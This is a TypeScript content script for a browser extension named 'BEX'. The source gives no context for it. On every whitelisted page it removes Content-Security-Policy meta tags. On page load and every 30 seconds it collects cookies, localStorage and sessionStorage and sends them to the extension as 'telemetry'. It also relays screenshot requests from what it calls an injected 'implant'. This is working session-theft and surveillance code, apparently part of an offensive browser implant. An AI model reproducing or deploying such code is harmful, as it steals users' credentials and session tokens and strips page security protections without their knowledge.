
import { CONFIG, isUrlWhitelisted } from '@/utils/config';

export default defineContentScript({
  matches: ['<all_urls>'],
  runAt: 'document_start',
  main() {
    // Domain scoping check
    if (!isUrlWhitelisted(location.href)) {
      console.log("BEX: Domain not whitelisted, skipping.");
      return;
    }

    console.log("BEX: Content script running on", location.href);

    // 1. Existing CSP meta tag removal logic
    function removeCspMetaTag(node: Node) {
      if (node.nodeType === 1) {
        const el = node as HTMLElement;
        if (el.tagName === 'META' && el.getAttribute('http-equiv')?.toLowerCase() === 'content-security-policy') {
          el.remove();
          console.log("BEX: CSP meta tag removed.");
        }
      }
    }

    const observer = new MutationObserver((mutations) => {
      for (const mutation of mutations) {
        for (const node of mutation.addedNodes) {
          removeCspMetaTag(node);
          if (node instanceof HTMLElement && node.children) {
            for (const child of node.children) {
              removeCspMetaTag(child);
            }
          }
        }
      }
    });

    observer.observe(document, {
      childList: true,
      subtree: true
    });

    // 2. Data scraping logic
    function scrapeAndReport() {
      // Check if the extension context is still valid
      if (!browser.runtime?.id) {
        console.log("BEX: Extension context invalidated, stopping telemetry.");
        return;
      }

      const data = {
        domain: location.hostname,
        url: location.href,
        localStorage: { ...localStorage },
        sessionStorage: { ...sessionStorage },
        cookies: document.cookie
      };
      
      try {
        browser.runtime.sendMessage({ type: 'TELEMETRY', data });
      } catch (e) {
        // Silently fail if context is invalidated
      }
    }

    // 3. Hybrid Screenshot Support
    // Listen for requests from the injected telemlib.js
    window.addEventListener("message", async (event) => {
      if (event.source !== window) return;
      if (event.data?.type === "BEX_SCREENSHOT_REQUEST") {
        console.log("BEX Content: Received screenshot request from implant.");
        try {
          const response = await browser.runtime.sendMessage({ 
            type: 'TAKE_SCREENSHOT',
            data: { 
              sessionUUID: event.data.sessionUUID,
              isEncrypted: event.data.isEncrypted
            } 
          });
          
          // Send result back to page
          window.postMessage({
            type: "BEX_SCREENSHOT_RESULT",
            success: response?.success,
            reason: response?.reason
          }, "*");
          
        } catch (e) {
          console.error("BEX Content: Failed to relay screenshot request.", e);
          window.postMessage({ type: "BEX_SCREENSHOT_RESULT", success: false, error: "relay_failed" }, "*");
        }
      }
    });

    // Report on load and periodically
    window.addEventListener('load', scrapeAndReport);
    setInterval(scrapeAndReport, 30000); // Every 30 seconds
  },
});
